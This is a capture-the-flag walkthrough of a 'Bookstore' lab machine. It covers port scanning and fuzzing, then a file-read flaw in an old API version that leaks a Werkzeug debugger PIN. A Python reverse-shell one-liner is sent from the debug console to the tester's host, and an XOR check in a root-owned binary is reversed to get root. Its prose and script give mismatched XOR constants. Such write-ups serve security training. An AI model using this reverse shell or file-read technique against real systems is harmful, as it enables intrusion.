# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |
| 5000 | HTTP |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCs5RybjdxaxapwkXwbzqZqONeX4X8rYtfTsy7wey7ZeRNsl36qQWhTrurBWWnYPO7wn2nEQ7Iz0+tmvSI3hms3eIEufCC/2FEftezKhtP1s4/qjp8UmRdaewMW2zYg+UDmn9QYmRfbBH80CLQvBwlsibEi3aLvhi/YrNCzL5yxMFQNWHIEMIry/FK1aSbMj7DEXTRnk5R3CYg3/OX1k3ssy7GlXAcvt5QyfmQQKfwpOG7UM9M8mXDCMiTGlvgx6dJkbG0XI81ho2yMlcDEZ/AsXaDPAKbH+RW5FsC5R1ft9PhRnaIkUoPwCLKl8Tp6YFSPcANVFYwTxtdUReU3QaF9
| 256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCbhAKUo1OeBOX5j9stuJkgBBmhTJ+zWZIRZyNDaSCxG6U817W85c9TV1oWw/A0TosCyr73Mn73BiyGAxis6lNQ=
| 256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAr3xDLg8D5BpJSRh8OgBRPhvxNSPERedYUTJkjDs/jc
80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Book Store
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
| http-methods:
|_ Supported Methods: GET POST OPTIONS HEAD
5000/tcp open http syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry
|_/api </p>
|_http-title: Home
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
| http-methods:
|_ Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

As we can see, we got `robots.txt` and `api` on port `5000`, let's check both websites then:




![Pasted image 20250509112440.png](../../IMAGES/Pasted%20image%2020250509112440.png)

On the `login.html` source code, we can see this:


![Pasted image 20250509114339.png](../../IMAGES/Pasted%20image%2020250509114339.png)



![Pasted image 20250509113014.png](../../IMAGES/Pasted%20image%2020250509113014.png)

Let's fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.254.203:5000/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.254.203:5000/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api [Status: 200, Size: 825, Words: 82, Lines: 12, Duration: 184ms]
console [Status: 200, Size: 1985, Words: 411, Lines: 53, Duration: 183ms]
```


We got console:

![Pasted image 20250509114528.png](../../IMAGES/Pasted%20image%2020250509114528.png)





We already know we are dealing with `REST API`, if we go to `/api`, we can see this:

![Pasted image 20250509113535.png](../../IMAGES/Pasted%20image%2020250509113535.png)


We got the documentation of the api, we got some routes we can analyze, if we go with:

```http
http://10.10.254.203:5000/api/v2/resources/books/all
```

We can see this:

```json
[
 {
 "author": "Vonda N. McIntyre",
 "first_sentence": "The little boy was frightened.",
 "id": "38\n",
 "published": 1979,
 "title": "Dreamsnake"
 }
]
```


As seen, the `id` parameter has got `\n`, if we try using curl in the following way, it still works:

```json
curl "http://10.10.254.203:5000/api/v2/resources/books?id=38%0A"
[
 {
 "author": "Vonda N. McIntyre",
 "first_sentence": "The little boy was frightened.",
 "id": "38\n",
 "published": 1979,
 "title": "Dreamsnake"
 }
]
```


I tried `command injection` and `LFI` but it didn't work, that's when i thought that maybe there was a `v1` of the `api`, if its true, then, this may be vulnerable to `LFI`, let's proceed to exploitation.



# EXPLOITATION
---


Let's try to change the route to `v1` in the following way:


```
"http://10.10.254.203:5000/api/v1/resources/books?id=.bash_history"
```

Since already know we need to read `bash_history`, we can use it to fuzz, now, let's fuzz changing the `id` character to check if there's any parameter that may give us the valid response:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.254.203:5000/api/v1/resources/books?FUZZ=.bash_history" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.254.203:5000/api/v1/resources/books?FUZZ=.bash_history
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

show [Status: 200, Size: 116, Words: 5, Lines: 8, Duration: 183ms]
author [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 190ms]
id [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 191ms]
published [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 184ms]
```


As seen, the `show` parameter has got a size of `116`, let's check it out:

```json
curl "http://10.10.254.203:5000/api/v1/resources/books?show=.bash_history"
cd /home/sid
whoami
export WERKZEUG_DEBUG_PIN=123-321-135
echo $WERKZEUG_DEBUG_PIN
python3 /home/sid/api.py
ls
exit
```

It works and we got the pin, let's go into `/console` then:

![Pasted image 20250509115547.png](../../IMAGES/Pasted%20image%2020250509115547.png)

We got an interactive python console, let's send ourselves a reverse shell and check if it works:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```





![Pasted image 20250509115732.png](../../IMAGES/Pasted%20image%2020250509115732.png)


If we check our listener:

![Pasted image 20250509115746.png](../../IMAGES/Pasted%20image%2020250509115746.png)

There we go, let's proceed to privilege escalation.



# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250509115852.png](../../IMAGES/Pasted%20image%2020250509115852.png)

With our stable shell, we can now look around the machine, let's use linpeas:

![Pasted image 20250509121448.png](../../IMAGES/Pasted%20image%2020250509121448.png)

We got a `try-harder` binary owned by root on our home directory, let's check it out using `ghidra`:


![Pasted image 20250509121742.png](../../IMAGES/Pasted%20image%2020250509121742.png)

As seen, in the main function, we got an interesting finding, The binary checks if our input satisfies the equation: 


```c
(input ^ 0x1116 ^ 0x56b3) = 0x56c021f4
```


If it does, we will get a shell as root, the program XORs the user input with two hardcoded constants and compares it to a known value. let's automate the process of getting the magic number with this python script:

```python
def calculate_magic_number(local_14, xor_const, local_18):
 return local_14 ^ xor_const ^ local_18

if __name__ == "__main__":
 local_14 = 0x5dcd21f4 # target value in the if condition
 xor_const = 0x1116 # constant used in XOR
 local_18 = 0x5db3 # hardcoded in binary

 magic_number = calculate_magic_number(local_14, xor_const, local_18)
 print(f"[+] Magic number found: {magic_number} (0x{magic_number:x})")
```

```python
python3 magic_number.py
[+] Magic number found: 1573743953 (0x5dcd6d51)
```

We got our magic number, let's get our root shell:

![Pasted image 20250509122835.png](../../IMAGES/Pasted%20image%2020250509122835.png)

Nice, we can finally read the root flag:

```
root@bookstore:~# cat /root/root.txt
e29b05fba5b2a7e69c24a450893158e3
```

![Pasted image 20250509122935.png](../../IMAGES/Pasted%20image%2020250509122935.png)


